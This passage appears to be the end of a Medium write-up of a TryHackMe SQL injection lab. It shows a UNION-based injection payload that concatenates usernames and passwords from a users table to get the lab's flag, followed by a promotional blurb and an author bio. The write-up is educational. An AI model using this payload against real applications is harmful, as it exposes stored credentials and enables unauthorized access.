<figure id="c29e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lOPwl2NDbWbYNMLn.png"
class="graf-image" data-image-id="0*lOPwl2NDbWbYNMLn.png"
data-width="672" data-height="324" />
</figure>

### Task {#12b7 .graf .graf--h3 .graf-after--figure name="12b7"}

Use what you learned about UNION-based SQL injection and exploit the
vulnerable book search function to retrieve the flag

``` {#7186 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
' union select '-1''union select 1,group_concat(username),group_concat(password),4 from users-- -
```

<figure id="7c49" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*RL0G0-x-9A_9SHs_.png"
class="graf-image" data-image-id="0*RL0G0-x-9A_9SHs_.png"
data-width="875" data-height="203" />
</figure>

BOOM ! we Got Final Flag

### Promote and Collaborate on Cybersecurity Insights {#2e6c .graf .graf--h3 .graf-after--p name="2e6c"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#b224 .graf .graf--h3 .graf-after--p name="b224"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 17, 2024](https://medium.com/p/7e4d90562991).

[Canonical
link](https://medium.com/@bevijaygupta/sql-injection-lab-tryhackme-writeup-7e4d90562991){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
